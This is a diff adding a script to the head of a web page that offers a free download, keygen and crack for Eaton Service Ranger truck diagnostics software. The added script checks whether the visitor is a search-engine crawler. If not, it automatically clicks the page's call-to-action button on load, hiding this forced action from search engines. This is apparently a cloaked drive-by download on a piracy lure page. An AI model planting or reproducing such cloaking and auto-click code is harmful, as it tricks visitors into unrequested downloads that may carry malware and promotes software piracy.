@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Eaton Service Ranger 4.12 Engineering Level 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Eaton Service Ranger 4.12 Engineering Level 05.2024 diagnostics software for quick and easy system diagnostics, now available in all regions with multi-language support.">
     <meta name="keywords" content="Eaton Service Ranger 4.12 Engineering Level 05.2024, Eaton Service Ranger 4.12 diagnostics software, Eaton Service Ranger 4.12 free download, Eaton Service Ranger 4.12 download, Eaton Service Ranger diagnostics software, Eaton Service Ranger 4.12 keygen, Eaton Service Ranger 4.12 crack, Eaton diagnostics software, RP1210A Adapters, Eaton hybrid powertrains diagnostics, Eaton ServiceRanger 2024, ServiceRanger 4.12 download, ServiceRanger 4.12 free, Каталог Eaton Service Ranger 4.12, Каталог Eaton Service Ranger 2024, Диагностическое программное обеспечение Eaton, Скачать Eaton Service Ranger 4.12 бесплатно, скачать Eaton Service Ranger 2024 бесплатно, Eaton Service Ranger 4.12 Ukrainian, каталог Eaton Service Ranger 4.12 скачать бесплатно">
     <style>
